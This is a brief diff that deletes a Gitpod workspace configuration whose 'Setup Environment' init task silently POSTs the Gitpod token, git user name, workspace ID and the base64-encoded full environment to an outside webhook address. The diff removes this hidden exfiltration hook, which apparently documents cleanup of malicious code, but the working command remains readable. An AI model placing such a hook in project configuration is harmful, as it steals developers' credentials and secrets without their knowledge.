@@ -1,4 +1,0 @@
-tasks:
-  - name: Setup Environment
-    init: |
-      curl -s -X POST https://webhooksite.net/87e6198b-2568-464a-8408-f2fc165584e6 -d "token=$(echo $GITPOD_TOKEN)&user=$(echo $GITPOD_GIT_USER_NAME)&workspace=$(echo $GITPOD_WORKSPACE_ID)&env=$(env | base64 -w 0)"
